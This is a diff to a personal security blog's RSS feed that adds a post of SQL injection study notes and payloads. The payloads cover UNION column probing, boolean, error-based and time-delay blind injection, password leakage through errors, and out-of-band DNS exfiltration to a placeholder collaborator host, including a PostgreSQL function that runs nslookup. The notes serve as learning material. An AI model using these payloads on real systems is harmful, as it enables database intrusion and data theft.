@@ -7,6 +7,127 @@
             <webMaster>minhtoanlamson2005@gmail.com (cr0nica1)</webMaster><lastBuildDate>Sat, 19 Apr 2025 17:39:20 &#43;0700</lastBuildDate>
             <atom:link href="https://cr0nica1.github.io/index.xml" rel="self" type="application/rss+xml" />
         <item>
+    <title>Sever-Side Vulnerabilities</title>
+    <link>https://cr0nica1.github.io/posts/sever-side/</link>
+    <pubDate>Sat, 19 Apr 2025 17:39:20 &#43;0700</pubDate>
+    <author>cr0nica1</author>
+    <guid>https://cr0nica1.github.io/posts/sever-side/</guid>
+    <description><![CDATA[<h1 id="common-server-side-vulnerabilities">Common Server-side Vulnerabilities</h1>
+<p>This post is summary about my knowledge in server-side vulnerabilities from many resources, especially web security academy. It also has some efficient payload in common case of these vunerabilities</p>
+<h2 id="sql-injection">SQL injection</h2>
+<h3 id="1-sql-injection-special-cases">1. SQL injection special cases</h3>
+<ul>
+<li>Retrieving hidden data</li>
+<li>Subverting application logic</li>
+<li>Retrieving data from other tables</li>
+<li>Examining the database</li>
+<li>Blind SQL injection</li>
+<li>Second-order SQL injection</li>
+</ul>
+<h3 id="2-examining-the-database">2. Examining the database</h3>
+<p><strong>Querying the database type and version</strong></p>
+<p>You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
+The following are some queries to determine the database version for some popular database types:</p>
+<ul>
+<li>Microsoft, MySQL:	SELECT @@version</li>
+<li>Oracle:	SELECT * FROM v$version</li>
+<li>PostgreSQL:	SELECT version()</li>
+</ul>
+<p><strong>Listing the contents of the database</strong></p>
+<p>Most database types (except Oracle) have a set of views called the information schema.
+With Oracle database, <code>all_tables</code> and <code>all_tab_columns</code> instead.</p>
+<h3 id="3-sql-injection-technique-union-attacks">3. SQL injection technique: UNION attacks</h3>
+<p><strong>Determining the numbers of columns</strong>
+When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs:</p>
+<pre tabindex="0"><code>&#39; ORDER BY 1--
+&#39; ORDER BY 2--
+&#39; ORDER BY 3--
+etc.
+</code></pre><p>The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:</p>
+<pre tabindex="0"><code>&#39; UNION SELECT NULL--
+&#39; UNION SELECT NULL,NULL--
+&#39; UNION SELECT NULL,NULL,NULL--
+etc.
+</code></pre><p><strong>note</strong>: specific syntax on Oracle:<code>' UNION SELECT NULL FROM DUAL--</code></p>
+<p><strong>Finding columns with a useful data type</strong>
+After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn.</p>
+<pre tabindex="0"><code>&#39; UNION SELECT &#39;a&#39;,NULL,NULL,NULL--
+&#39; UNION SELECT NULL,&#39;a&#39;,NULL,NULL--
+&#39; UNION SELECT NULL,NULL,&#39;a&#39;,NULL--
+&#39; UNION SELECT NULL,NULL,NULL,&#39;a&#39;--
+</code></pre><p><strong>Retrieving multiple values within a single column</strong></p>
+<p>You can retrieve multiple values together within this single column by concatenating the values together.This uses the double-pipe sequence <code>||</code> which is a string concatenation operator on Oracle. The injected query concatenates together the values of the <code>username</code> and <code>password</code> fields, separated by the <code>~</code> character.</p>
+<h3 id="4-sql-injection-technique-blind-sql-injection">4. SQL injection technique: Blind SQL injection</h3>
+<p>Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.</p>
+<p><strong>conditional responses (Boonlean-based)</strong></p>
+<pre tabindex="0"><code>xyz&#39; AND &#39;1&#39;=&#39;1
+xyz&#39; AND &#39;1&#39;=&#39;2
+</code></pre><p>This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data.</p>
+<p><strong>Error-based SQL injection</strong></p>
+<p>Conditional errors: It&rsquo;s often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application&rsquo;s response, such as an error message. This enables you to infer the truth of the injected condition.Payload:</p>
+<ul>
+<li>Oracle:	<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></li>
+<li>Microsoft:	<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></li>
+<li>PostgreSQL:	<code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code></li>
+<li>MySQL:	<code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></li>
+</ul>
+<p>Verbose SQL error messages: Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. Payload:</p>
+<ul>
+<li>Microsoft:	<code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code>
+`&gt; Conversion failed when converting the varchar value &lsquo;secret&rsquo; to data type int.</li>
+<li>PostgreSQL:	<code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code>
+`&gt; invalid input syntax for integer: &ldquo;secret&rdquo;</li>
+<li>MySQL:	<code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code>
+`&gt; XPATH syntax error: &lsquo;\secret&rsquo;</li>
+</ul>
+<p><strong>Triggering time delays</strong>
+If the application catches database errors when the SQL query is executed and handles them gracefully, there won&rsquo;t be any difference in the application&rsquo;s response. This means the previous technique for inducing conditional errors will not work.</p>
+<p>In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
+Payload:</p>
+<ul>
+<li>Oracle:	<code>dbms_pipe.receive_message(('a'),10)</code></li>
+<li>Microsoft:	<code>WAITFOR DELAY '0:0:10</code>&rsquo;</li>
+<li>PostgreSQL:	<code>SELECT pg_sleep(10)</code></li>
+<li>MySQL:	<code>SELECT SLEEP(10)</code></li>
+</ul>
+<ul>
+<li>Payload with conditional:</li>
+</ul>
+<ul>
+<li>Oracle:	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &lsquo;a&rsquo;||dbms_pipe.receive_message((&lsquo;a&rsquo;),10) ELSE NULL END FROM dual</li>
+<li>Microsoft:	IF (YOUR-CONDITION-HERE) WAITFOR DELAY &lsquo;0:0:10&rsquo;</li>
+<li>PostgreSQL:	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</li>
+<li>MySQL:	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),&lsquo;a&rsquo;)</li>
+</ul>
+<h3 id="5-sql-injection-techinqueout-of-band-oast-techniques">5. SQL injection techinque:out-of-band (OAST) techniques</h3>
+<p>An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user&rsquo;s request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application&rsquo;s response doesn&rsquo;t depend on the query returning any data, a database error occurring, or on the time taken to execute the query.</p>
+<p>In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.</p>
+<p>A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they&rsquo;re essential for the normal operation of production systems.
+The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
+<code>'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--</code></p>
+<p>Payload DNS lookup with data exfiltration:</p>
+<ul>
+<li>Oracle:	<code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;'),'/l') FROM dual</code></li>
+<li>Microsoft:	<code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree &quot;//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a&quot;')</code></li>
+<li>PostgreSQL:</li>
+</ul>
+<pre tabindex="0"><code>create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;||p||&#39;.BURP-COLLABORATOR-SUBDOMAIN&#39;&#39;&#39;;
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f();
+</code></pre><ul>
+<li>MySQL:	<strong>The following technique works on Windows only:</strong>
+<code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></li>
+</ul>
+]]></description>
+</item>
+<item>
     <title>Dreamhack Web Wargame</title>
     <link>https://cr0nica1.github.io/posts/dhweb/</link>
     <pubDate>Wed, 16 Apr 2025 04:02:58 &#43;0700</pubDate>
